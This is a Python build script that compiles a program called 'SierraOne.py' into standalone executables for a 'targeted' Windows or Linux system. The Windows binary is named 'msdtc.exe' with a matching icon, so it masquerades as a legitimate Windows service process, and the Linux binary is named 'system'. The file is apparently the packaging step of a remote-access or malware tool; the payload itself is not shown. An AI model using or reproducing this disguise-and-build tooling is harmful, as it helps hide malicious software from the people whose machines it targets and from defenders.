from argparse import ArgumentParser
from os import remove
from shutil import rmtree
from subprocess import run
from sys import exit
from time import sleep


def remove_junk():
    rmtree("build")
    rmtree("__pycache__")


def builder(dist):
    if dist == "windows":
        run(["wine",
             "pyinstaller",
             "--onefile",
             "--icon=media/msdtc.ico",
             "-n",
             "msdtc.exe",
             "SierraOne.py"])
        sleep(1)
        remove("msdtc.exe.spec")
        remove_junk()
        print("\nDone. Check 'dist' for your file")

    elif dist == "linux":
        run(["pyinstaller",
             "--onefile",
             "-n",
             "system",
             "SierraOne.py"])
        sleep(1)
        remove("system.spec")
        remove_junk()
        print("\nDone. Check 'dist' for your file")

    else:
        print("Unsupported operating system")

    exit(0)


def main():
    parser = ArgumentParser()
    parser.add_argument("-o",
                        "--os",
                        metavar="",
                        required=True,
                        type=str,
                        help="Targeted operating system (Windows, Linux)")

    try:
        args = parser.parse_args()

    except:
        print("Missing arguments")
        exit(0)

    builder(args.os.lower())


if __name__ == "__main__":
    main()
